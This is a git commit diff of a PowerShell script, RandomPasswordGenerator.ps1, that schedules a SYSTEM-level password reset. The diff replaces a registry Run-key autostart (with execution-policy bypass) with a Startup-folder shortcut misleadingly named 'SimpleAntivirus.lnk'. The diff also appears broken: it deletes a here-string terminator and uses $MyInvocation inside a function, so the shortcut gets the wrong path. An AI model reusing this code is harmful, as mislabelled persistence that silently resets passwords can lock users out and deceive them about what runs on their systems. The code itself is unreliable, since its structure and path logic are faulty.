013e03c6960d36fe1781e837ecd22ce9265bcfd5
GorstaksWindows <161788499+GorstaksWindows@users.noreply.github.com>
2024-03-15 12:55:26 -0700

    Add files via upload

--- RandomPasswordGenerator.ps1
+++ RandomPasswordGenerator.ps1
@@ -37,22 +37,31 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command 
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
 Register-ScheduledTask -TaskName "ResetPassword" -Action $action -Trigger $trigger -User "SYSTEM"
 
-"@
+# Function to add the script to Windows startup folder
+function AddToStartup {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+    $startupFolderPath = [Environment]::GetFolderPath("Startup")
+    $shortcutPath = Join-Path $startupFolderPath "SimpleAntivirus.lnk"
 
-    # Create the script file
-    $scriptContent | Out-File -FilePath $scriptPath -Encoding utf8
-
-    # Create a shortcut to the script in the startup folder
-    $shortcutPath = "$startupFolder\PasswordChangeScript.lnk"
-    $WshShell = New-Object -ComObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut($shortcutPath)
-    $shortcut.TargetPath = "powershell.exe"
-    $shortcut.Arguments = "-ExecutionPolicy Bypass -File ""$scriptPath"""
-    $shortcut.Save()
+    if (-Not (Test-Path $shortcutPath)) {
+        $WScriptShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+        $Shortcut.TargetPath = $scriptPath
+        $Shortcut.Save()
+        Write-Host "Script added to startup."
+    }
 }
 
-# Register the script to run as administrator at startup
-$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "PasswordChangeScript"
-$regValue = "powershell.exe -ExecutionPolicy Bypass -File ""$scriptPath"""
-New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force
+# Check if the script is already added to startup
+function IsInStartup {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+    $startupFolderPath = [Environment]::GetFolderPath("Startup")
+    $shortcutPath = Join-Path $startupFolderPath "SimpleAntivirus.lnk"
+
+    return (Test-Path $shortcutPath)
+}
+
+# Check if the script is already added to startup
+if (-Not (IsInStartup)) {
+    AddToStartup
+}
